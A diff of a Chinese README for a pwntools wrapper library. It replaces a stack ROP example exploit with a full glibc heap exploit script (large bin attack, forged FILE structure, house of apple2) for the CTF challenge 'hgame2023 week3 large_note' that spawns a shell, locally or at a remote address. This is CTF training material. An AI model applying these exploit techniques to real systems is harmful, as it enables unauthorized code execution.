@@ -10,9 +10,12 @@
 
 本脚本是基于Python3的pwntools，使用到了一些Python3独有的f-string之类的东西，所以Python2的pwner可能无法使用，得自己改改
 
-使用方法非常的简单, 把下面的pwntools.py放到`~/.local/lib/python3.X/site-packages`, Python默认导包的路径就行了
+使用方法非常的简单：
 
-随便写了一个脚本用例来参考一下
+- 把pwntools.py放到`~/.local/lib/python3.X/site-packages`, 即Python导包的路径
+- 放在执行路径的同级目录下
+
+随便写了一个经典的`house of apple2`的脚本用例来参考一下，题目是`hgame2023 week3 large_note`
 
 - 如果是打本地, 直接`python3 exp.py`就可以进行本地运行了
 - 如果是打远程, 使用`python3 exp.py 114.51.41.91:11451` 或者 `python3 exp.py 114.51.41.91 11451` 就可以自动打远程
@@ -22,44 +25,146 @@
 ```python
 from pwntools import *
 
-init("./buffer_fly")    # 调用init函数,每次只需要调用这个就可以开始写题了,必要的参数是文件名！
+# 初始化程序
+init("./vuln")
 
-sla("name", "")
+# 获取需要使用的io、elf和libc对象
+io: tube = pwnio.io
+elf: ELF = pwnio.elf
+libc: ELF = pwnio.libc
 
-ru("your name:")
-rl()
+cmd = lambda idx: sla(">", str(idx))
 
-close_plt = pwnio.elf.plt["close"]    # 注意要调用pwnio这个类中的elf,也可以使用pwnio["elf"].plt["close"]
 
-true_close_plt = i16(hex(uu64(ru("\n"))) + "0a") - 10
-info(true_close_plt)
-base = true_close_plt - (0x55765683C100 - 0x55765683B000)
-info(base)
+def add(idx, size=0x500):
+    cmd(1)
+    sla("Index: ", str(idx))
+    sla("Size: ", str(size))
 
-pop_rdi_ret = 0x0000000000001423 + base
-ret = 0x000000000000101A + base
 
-sa("age", b"/bin/sh|")
-ru("your age:")
-stack = l64()   # l64是一个封装好的接受\x7f开头的64位地址
+def free(idx):
+    cmd(2)
+    sla("Index: ", str(idx))
 
-info(f"stack --> {hex(stack)}")
 
-bin_sh = stack + (0x7FFC4757AF40 - 0x7FFC4757B060)
-back_door = base + 0x129D
+def edit(idx, content):
+    cmd(3)
+    sla("Index: ", str(idx))
+    sa("Content: ", content)
 
-payload = (
-    b"sh 0>&2 ".ljust(0x28, b"a")
-    + p64(pop_rdi_ret)
-    + p64(bin_sh)
-    + p64(back_door)
-    + p64(0)
-)
 
-dbg()   # 调用gdb.attach, 如果是远程, 那么就不会执行
+def show(idx):
+    cmd(4)
+    sla("Index: ", str(idx))
 
-sa("number", payload)
-sl("sh 1>&2")
+
+def pack(pos, ptr):
+    return (pos >> 12) ^ ptr
+
+
+def build_fake_file(addr, vtable, _wide_data):
+    # flag = 0xFBAD2887
+    # fake_file = p64(flag)  # _flags
+    # fake_file += p64(addr)  # _IO_read_ptr
+    # 不用上面的flag和_IO_read_ptr是因为chunk里不可控上面两个字段
+    fake_file = b""
+    fake_file += p64(addr)  # _IO_read_end
+    fake_file += p64(addr)  # _IO_read_base
+    fake_file += p64(addr)  # _IO_write_base
+    fake_file += p64(addr + 1)  # _IO_write_ptr
+    fake_file += p64(addr)  # _IO_write_end
+    fake_file += p64(addr)  # _IO_buf_base
+    fake_file += p64(0)  # _IO_buf_end
+    fake_file += p64(0)  # _IO_save_base
+    fake_file += p64(0)  # _IO_backup_base
+    fake_file += p64(0)  # _IO_save_end
+    fake_file += p64(0)  # _markers
+    fake_file += p64(0)  # _chain   could be a anathor file struct
+    fake_file += p32(1)  # _fileno
+    fake_file += p32(0)  # _flags2
+    fake_file += p64(0)  # _old_offset
+    fake_file += p16(0)  # _cur_column
+    fake_file += p8(0)  # _vtable_offset
+    fake_file += p8(0x10)  # _shortbuf
+    fake_file += p32(0)
+    fake_file += p64(0)  # _lock
+    fake_file += p64(0)  # _offset
+    fake_file += p64(0)  # _codecvt
+    fake_file += p64(_wide_data)  # _wide_data
+    fake_file += p64(0)  # _freeres_list
+    fake_file += p64(0)  # _freeres_buf
+    fake_file += p64(0)  # __pad5
+    fake_file += p32(0)  # _mode
+    fake_file += p32(0)  # unused2
+    fake_file += p64(0) * 2  # unused2
+    fake_file += p64(vtable)  # vtable
+    return fake_file
+
+
+"""
+#! large bin leak heap address
+#! large bin attack --> fake io --> house of apple2
+#! exec system("  sh;")
+"""
+
+add(0, 0x508)  # fake_wide_data
+add(1, 0x550)  # fake_chain
+add(2)
+add(3, 0x540)
+add(4)
+
+#! leak libc base
+free(1)
+edit(1, "a")
+show(1)
+fd_bk = leak(l64() - 0x61, "fd_bk")
+libc.address = leak(fd_bk - 0x1E3C00, "libc")
+edit(1, b"\x00")
+
+#! to large bin
+add(5, 0x600)  # fake_jump
+
+#! large leak fd_next to get heap base
+edit(1, b"a" * 15 + b"b")
+show(1)
+ru("b")
+heap_base = leak(uu64(r(6)) - 0x7A0, "heap_base")
+edit(1, p64(fd_bk) * 2)
+
+#! free large_chunk2 into unsortedbin
+free(3)
+
+#! modify largebin[0]->bk_nextsize -> tagert_addr-0x20
+_IO_list_all_chain = libc.address + 0x1E4648
+info(_IO_list_all_chain, "_IO_list_all_chain")
+edit(1, p64(fd_bk) * 2 + p64(heap_base + 0x7A0) + p64(_IO_list_all_chain - 0x20))
+info(heap_base + 0x7A0, "fake_IO")
+#! large bin attack : chain -> heap_base + 0x7a0
+add(6)
+
+#! edit _flags -> "  sh;"
+edit(0, b"\x00" * 0x500 + b"  sh;")
+
+#! bulid fake_wide_data
+fake_wide_data = heap_base + 0x2A0
+info(fake_wide_data, "fake_wide_data")
+
+#! edit vtable -> _IO_wfile_jumps
+#! edit fp -> _wide_data = fake_wide_data
+_IO_wfile_jumps = libc.sym["_IO_wfile_jumps"]
+edit(1, build_fake_file(0, _IO_wfile_jumps, fake_wide_data))
+
+#! edit fake_wide_data -> _IO_write_base = 0
+#! edit fake_wide_data -> _IO_buf_base = 0
+#! edit fake_wide_data -> _wide_vtable = fake_jump
+#! edit fake_jump -> doallocate = system
+fake_jump = heap_base + 0x1C70
+_wide_data = {0x18: 0, 0x30: 0, 0xE0: fake_jump}
+edit(0, flat(_wide_data))
+edit(5, p64(libc.sym["system"]) * 12)
+
+dbg();pau()     # 如果是远程就不会执行debug调试
+cmd(5)
 
 ia()    # 交互
 ```
